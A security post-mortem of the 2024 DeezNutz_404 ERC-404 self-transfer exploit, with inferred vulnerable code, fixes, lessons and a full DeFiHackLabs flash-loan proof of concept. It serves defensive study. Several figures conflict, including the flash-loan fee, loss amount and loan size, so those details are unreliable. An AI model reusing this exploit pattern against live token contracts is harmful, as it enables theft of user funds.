# DeezNutz_404 — ERC-404 Self-Transfer Accounting Bug Analysis

| Item | Details |
|------|------|
| **Date** | 2024-02-21 |
| **Protocol** | DeezNutz_404 (DN) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$170,000 (~58.65 ETH) |
| **Attacker** | [0xd215...0dfd](https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd) (bigbrainchad.eth) |
| **Attack Contract** | [0xd129...ecd](https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd) |
| **Attack Tx** | [0xbeef...2d61](https://etherscan.io/tx/0xbeefd8faba2aa82704afe821fd41b670319203dd9090f7af8affdf6bcfec2d61) |
| **Vulnerable Contract** | [0xb57E...0b8a](https://etherscan.io/address/0xb57e874082417b66877429481473cf9fcd8e0b8a#code) |
| **Attack Block** | 19,277,803 |
| **Root Cause** | Double-counting of balance due to memory caching during self-transfer (from == to) in the ERC-404 `transfer` function |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DeezNutz404_exp.sol) |

---

## 1. Vulnerability Overview

DeezNutz_404 is a protocol that adopts the experimental **ERC-404 hybrid standard**, implementing both ERC-20 token functionality and ERC-721 NFT functionality simultaneously.

The ERC-404 standard includes logic that automatically mints or burns NFTs during token transfers. A critical flaw existed in the way the `_transfer` internal function updated balances during this process.

**Core Bug**: When transferring in the form `transfer(address(this), amount)` where **the sender and receiver are the same address**, the balance update logic performs addition based on the old value loaded into memory, causing **a higher balance than the actual balance** to be recorded.

The attacker exploited this bug 5 times in succession to acquire far more DN tokens than initially purchased, then dumped them into a Uniswap V2 pool to realize approximately 58.65 ETH (~$170,000) in profit.

---

## 2. Vulnerable Code Analysis

### 2.1 Self-Transfer Balance Double-Counting (Core Vulnerability)

The problem is the pattern of using memory variables when updating balances inside the ERC-404 standard's `_transfer` function.

**Vulnerable Code (inferred)**:
```solidity
function _transfer(address from, address to, uint256 amount) internal {
    // ❌ Load balances into memory first
    uint256 fromBalance = balanceOf[from];
    uint256 toBalance = balanceOf[to];

    // ❌ No validation when from == to
    // When from and to are the same address:
    //   fromBalance = X (balance at the time it was recorded in memory)
    //   toBalance   = X (same value since it's the same address)

    require(fromBalance >= amount, "insufficient balance");

    // ❌ Deduct sender balance: balanceOf[from] = X - amount
    balanceOf[from] = fromBalance - amount;

    // ❌ Add receiver balance: balanceOf[to] = X + amount
    //    However, since from == to, the already-deducted storage value
    //    is ignored and amount is added to the old memory value X
    //    Result: balanceOf[address] = X + amount (no deduction effect)
    balanceOf[to] = toBalance + amount;

    // ERC-404 NFT auto mint/burn logic
    // ... (NFT processing based on incorrect balance)
}
```

**Fixed Code**:
```solidity
function _transfer(address from, address to, uint256 amount) internal {
    // ✅ Explicitly block self-transfer
    require(from != to, "ERC404: self-transfer not allowed");

    uint256 fromBalance = balanceOf[from];
    require(fromBalance >= amount, "ERC404: insufficient balance");

    // ✅ Update with guarantee that from and to are different addresses
    unchecked {
        balanceOf[from] = fromBalance - amount;
    }
    // ✅ Read directly from storage to update with latest value
    balanceOf[to] += amount;

    emit Transfer(from, to, amount);
}
```

**The Problem**: When `from` and `to` are the same address, `toBalance` retains the old memory value from before the `fromBalance` deduction. Therefore, when `balanceOf[to] = toBalance + amount` executes, it adds `amount` to the original value rather than the deducted value, effectively **creating tokens out of thin air** equal to `amount`.

### 2.2 Missing `from == to` Validation

```solidity
// ❌ ERC-404 standard transfer function: only zero-address validation exists
function transfer(address to, uint256 amount) public returns (bool) {
    require(to != address(0), "transfer to zero address"); // only blocks zero address
    // ❌ No require(to != msg.sender) validation — self-transfer allowed
    _transfer(msg.sender, to, amount);
    return true;
}
```

```solidity
// ✅ Fixed version
function transfer(address to, uint256 amount) public returns (bool) {
    require(to != address(0), "transfer to zero address");
    require(to != msg.sender, "ERC404: self-transfer prohibited"); // ✅ Block self-transfer
    _transfer(msg.sender, to, amount);
    return true;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No prior setup (atomic single transaction)
- Utilized Balancer V2 Flash Loan functionality (zero fee)
- Attacker: bigbrainchad.eth (0xd215...0dfd)

### 3.2 Execution Phase

1. **Flash Loan**: Borrowed 2,000 WETH interest-free from Balancer Vault
2. **Buy DN Tokens**: Swapped WETH → DN via UniswapV2 Router (2,000 WETH → ~59,171,134 DN)
3. **Self-Transfer Loop (5 iterations)**: `DeezNutz.transfer(address(this), balanceOf)` — balance doubles each iteration
4. **Pre-inject Liquidity Pool**: Directly transferred 1/20 of DN balance to Uniswap V2 pair address (pool reserve manipulation)
5. **Sell DN Tokens**: Swapped amplified DN → WETH via UniswapV2 Router
6. **Repay Flash Loan**: Returned 2,001 WETH to Balancer (including 1 WETH fee)
7. **Profit Realized**: ~58.65 ETH (~$170,000) net profit

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│  Attacker (bigbrainchad.eth)                                 │
│  0xd215...0dfd                                              │
└──────────────────────┬──────────────────────────────────────┘
                       │ 1. flashLoan(2,000 WETH)
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Balancer Vault                                              │
│  0xBA12...2C8                                               │
│  [Provides interest-free flash loan]                         │
└──────────────────────┬──────────────────────────────────────┘
                       │ 2. receiveFlashLoan callback
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Attack Contract                                             │
│  0xd129...ecd                                               │
└──┬───────────────────┬──────────────────────────────────────┘
   │                   │
   │ 3. swap           │
   │ WETH→DN           │
   ▼                   │
┌──────────────────┐   │
│ UniswapV2 Router │   │
│ 0x7a25...88D     │   │
│                  │   │
│ 2,000 WETH       │   │
│    ──▶           │   │
│ ~59,171,134 DN   │   │
└──────────────────┘   │
   │ Receive 59M DN     │
   ▼                   │
┌──────────────────────────────────────────────────────────────┐
│  Self-Transfer Loop (5 iterations)                           │
│                                                              │
│  Round 0: transfer(self, 59,171,134 DN)  → Balance: 118,342,268 DN│
│  Round 1: transfer(self, 118,342,268 DN) → Balance: 236,684,536 DN│
│  Round 2: transfer(self, 236,684,536 DN) → Balance: 473,369,072 DN│
│  Round 3: transfer(self, 473,369,072 DN) → Balance: 946,738,144 DN│
│  Round 4: transfer(self, 946,738,144 DN) → Balance: 1,893,476,288 DN│
│                                                              │
│  ❌ Balance doubles each round due to memory bug             │
└──────────────────────┬───────────────────────────────────────┘
                       │ Holds ~1.89B DN
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Uniswap V2: DN/WETH Pool                                    │
│  0x1fB4...51E2                                              │
│  [Reserve manipulated via direct 1/20 DN transfer]          │
└──────────────────────┬──────────────────────────────────────┘
                       │ 5. Large-scale DN dump
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  UniswapV2 Router                                            │
│  ~1.89B DN → ~2,058.65 WETH                                 │
└──────────────────────┬──────────────────────────────────────┘
                       │ 6. Repay: 2,001 WETH → Balancer
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Net Profit: ~58.65 ETH ≈ $170,000                          │
│  Transferred to attacker wallet                              │
└─────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker Profit**: ~58.65 ETH (~$170,000)
- **Protocol Loss**: DN/WETH liquidity pool fully drained, DN token value collapsed
- **Flash Loan Cost**: 1 WETH (Balancer fee)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// DeezNutz_404 Exploit PoC
// Author: DeFiHackLabs
// Attack Date: 2024-02-21
// Loss: ~170K USD

contract DeezNutzTest is Test {
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DeezNutz = IERC20(0xb57E874082417b66877429481473CF9FCd8e0b8a); // Vulnerable contract
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    address pair = 0x1fB4904b26DE8C043959201A63b4b23C414251E2; // DN/WETH UniswapV2 pool

    function setUp() public {
        // Fork at block just before attack
        vm.createSelectFork("mainnet", 19_277_802);
    }

    function testExploit() public {
        // [Step 1] Request 2,000 WETH flash loan from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2000 ether;

        vault.flashLoan(address(this), tokens, amounts, "");
        // Log net profit after attack completes
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        // [Step 2] Approve borrowed WETH to Router
        WETH.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DeezNutz);

        // [Step 3] Swap all WETH to DN tokens
        // 2,000 WETH → ~59,171,134 DN
        router.swapExactTokensForTokens(
            WETH.balanceOf(address(this)),
            0,
            path,
            address(this),
            type(uint256).max
        );

        // [Step 4] Core attack: self-transfer loop 5 times
        // Exploits the memory caching bug in ERC-404 _transfer
        // Balance doubles each iteration (59M → 118M → 236M → 473M → 946M → 1.89B)
        for (uint256 x = 0; x < 5; x++) {
            // ❌ from == to: triggers accounting bug
            DeezNutz.transfer(address(this), DeezNutz.balanceOf(address(this)));
        }
        // At this point holds ~1.89B DN (~32x the initial purchase)

        // [Step 5] Prepare to swap DN back to WETH
        DeezNutz.approve(address(router), type(uint256).max);
        path[0] = address(DeezNutz);
        path[1] = address(WETH);

        // [Step 6] Pre-inject to manipulate Uniswap pool reserves
        // Directly transfer 1/20 of DN balance to pair contract
        DeezNutz.transfer(pair, DeezNutz.balanceOf(address(this)) / 20);

        // [Step 7] Dump all remaining DN to WETH
        router.swapExactTokensForTokens(
            DeezNutz.balanceOf(address(this)),
            0,
            path,
            address(this),
            type(uint256).max
        );

        // [Step 8] Repay flash loan (principal 2,000 + fee 1 WETH)
        WETH.transfer(msg.sender, 2001 ether);
        // Remaining ~58.65 WETH is attacker net profit
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | ERC-404 self-transfer balance double-counting | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Missing `from == to` validation | HIGH | CWE-20 (Improper Input Validation) |
| V-03 | Storage state inconsistency after memory caching | HIGH | CWE-362 (TOCTOU-like) |
| V-04 | Flash loan composability | MEDIUM | CWE-841 (Improper Enforcement of Behavioral Workflow) |

### V-01: ERC-404 Self-Transfer Balance Double-Counting

- **Description**: When `_transfer(from, to, amount)` executes, it loads the balances of `from` and `to` into memory variables before computing. When `from == to`, after deducting the sender's balance, the receiver's balance is overwritten with the old memory value, creating tokens equal to `amount` out of thin air.
- **Impact**: If the attacker performs 5 self-transfers with their held tokens, the balance amplifies 32x (2⁵). Repeating this allows theoretically unlimited token minting.
- **Attack Conditions**: Holding DN tokens; single transaction (no capital required when combined with Flash Loan)

### V-02: Missing `from == to` Validation

- **Description**: The ERC-20 standard only requires `to != address(0)` validation. ERC-404 performs bilateral balance modifications, making `from != to` an additional mandatory check that was missing from the implementation.
- **Impact**: Balance manipulation via self-transfer
- **Attack Conditions**: No special permissions required (exploitable by any token holder)

### V-03: Storage State Inconsistency After Memory Caching

- **Description**: In Solidity, `uint256 toBalance = balanceOf[to]` copies the storage value into memory. Subsequent changes to `balanceOf[from]` do not update `toBalance`. When `from == to`, this inconsistency leads to balance manipulation.
- **Impact**: Asset integrity destroyed due to state inconsistency
- **Attack Conditions**: Ability to call with `from == to`

### V-04: Flash Loan Composability

- **Description**: An atomic attack is possible whereby flash loans are used to acquire large amounts of tokens without any initial capital, the vulnerability is exploited, and the principal is repaid.
- **Impact**: Removes attack barrier (no capital required)
- **Attack Conditions**: Access to zero-fee flash loan providers such as Balancer

---

## 6. Remediation Recommendations

### Immediate Actions

#### Action 1: Add `from != to` Validation

```solidity
// ✅ Add self-transfer block to transfer function
function transfer(address to, uint256 amount) public override returns (bool) {
    require(to != address(0), "ERC404: transfer to zero address");
    require(to != msg.sender, "ERC404: self-transfer not allowed"); // ✅ Added
    _transfer(msg.sender, to, amount);
    return true;
}

// ✅ Apply identically to transferFrom
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    require(to != address(0), "ERC404: transfer to zero address");
    require(from != to, "ERC404: self-transfer not allowed"); // ✅ Added
    _spendAllowance(from, msg.sender, amount);
    _transfer(from, to, amount);
    return true;
}
```

#### Action 2: Direct Storage Reference Inside `_transfer`

```solidity
// ✅ Update storage directly instead of using memory caching
function _transfer(address from, address to, uint256 amount) internal {
    require(from != to, "ERC404: self-transfer not allowed");
    require(balanceOf[from] >= amount, "ERC404: insufficient balance");

    // ✅ Modify storage directly without memory variables
    unchecked {
        balanceOf[from] -= amount;
    }
    balanceOf[to] += amount; // ✅ Updated based on latest storage value

    emit Transfer(from, to, amount);
    _afterTokenTransfer(from, to, amount); // NFT mint/burn handling
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Self-transfer balance bug | Add `from != to` require inside `_transfer` |
| V-02 Missing validation | Strengthen input validation across all public functions |
| V-03 Memory-storage inconsistency | Apply direct storage reference pattern for compound state modifications |
| V-04 Flash loan composability | Consider introducing rate limiting on large token transfers within a single block |
| Overall ERC-404 safety | Mandate professional audit before adopting experimental standards; conduct sufficient testing in staging environment |

---

## 7. Lessons Learned

1. **Risks of Experimental Standards**: ERC-404 is an unofficial experimental standard that has not undergone formal review by the Ethereum community. The ERC-20 + ERC-721 hybrid structure can produce unexpected edge cases in the interaction between the two standards. A higher level of auditing is required when adopting tokens whose standards are not yet formalized.

2. **Self-transfers (`from == to`) must always be handled explicitly**: The ERC-20 standard does not prohibit self-transfers. However, when custom logic modifies both sides of a balance, a `from != to` check is mandatory. This was a vulnerability that could have been defended against with a single prerequisite check on one line.

3. **Memory Caching and State Consistency**: In Solidity, once a storage value is copied into a memory variable, subsequent modifications to storage do not update the memory variable. Logic where reads and writes to the same address are interleaved (e.g., same receiver/sender) must always use direct storage references.

4. **Flash Loan Availability Reduces Attack Barrier to Zero**: Balancer V2 provides zero-fee flash loans. Protocols must evaluate whether their vulnerabilities can be combined with capital amplification. When large-scale exploits become possible with minimal capital, the likelihood of actual attacks increases substantially.

5. **The Same Vulnerability Propagates Across All Projects Adopting the Same Standard**: Other projects that adopted ERC-404 and used the same `_transfer` implementation pattern are exposed to the identical vulnerability. Following this incident, numerous ERC-404 family tokens suffered similar attacks. It must be recognized that vulnerabilities in shared libraries or common implementations can propagate across an entire ecosystem.

6. **Self-transfer loops for balance amplification must be included in test suites**: This was a bug that could have been caught before deployment if unit tests had included `transfer(address(this), balance)` cases and repeated execution cases. Edge case testing (zero address, self address, max/min values) should be included in the basic checklist for token contract audits.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Data Comparison

| Item | PoC Value | On-Chain Actual | Notes |
|------|--------|-------------|------|
| Flash Loan Amount | 2,000 WETH | 2,397.63 ETH (estimated including swap routes) | Approximate match |
| Net Profit | ~58 ETH+ | 58.65 ETH (~$131,411) | Match |
| Self-Transfer Count | 5 times | Multiple Transfer events confirmed in on-chain logs | Match |
| Attacker Address | PoC attacker | 0xd215...0dfd (bigbrainchad.eth) | Match |
| Attack Block | 19,277,802 fork | 19,277,803 execution | Match (fork + 1) |
| Flash Loan Repayment | 2,001 WETH | Balancer Vault repayment confirmed | Match |

### 8.2 Key On-Chain Event Log Sequence

1. `Transfer` (WETH → Attack Contract, Balancer Flash Loan)
2. `Approval` (WETH → UniswapV2 Router)
3. `Swap` (UniswapV2: WETH → DN, ~59M DN received)
4. `Transfer` × 5 (DN self-transfers, balance amplification)
5. `Transfer` (DN → UniswapV2 Pair, 1/20 direct injection)
6. `Swap` (UniswapV2: DN → WETH, large-scale dump)
7. `Transfer` (WETH → Balancer Vault, flash loan repayment)

### 8.3 Precondition Verification

- Attack contract WETH balance before attack: 0 (covered by Flash Loan)
- DN token Pair (0x1fB4...51E2) liquidity confirmed to exist
- Balancer Vault Flash Loan functionality confirmed active
- No separate attacker capital required (fully zero-capital attack)

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DeezNutz404_exp.sol)
- [BlockSec Monthly Security Review (February 2024)](https://blocksec.com/blog/monthly-security-review-february-2024)
- [Web3IsGoingGreat Incident Record](https://www.web3isgoinggreat.com/?id=deeznutz404-hack)
- [Etherscan Attack Transaction](https://etherscan.io/tx/0xbeefd8faba2aa82704afe821fd41b670319203dd9090f7af8affdf6bcfec2d61)
- [Vulnerable Contract (Etherscan)](https://etherscan.io/address/0xb57e874082417b66877429481473cf9fcd8e0b8a#code)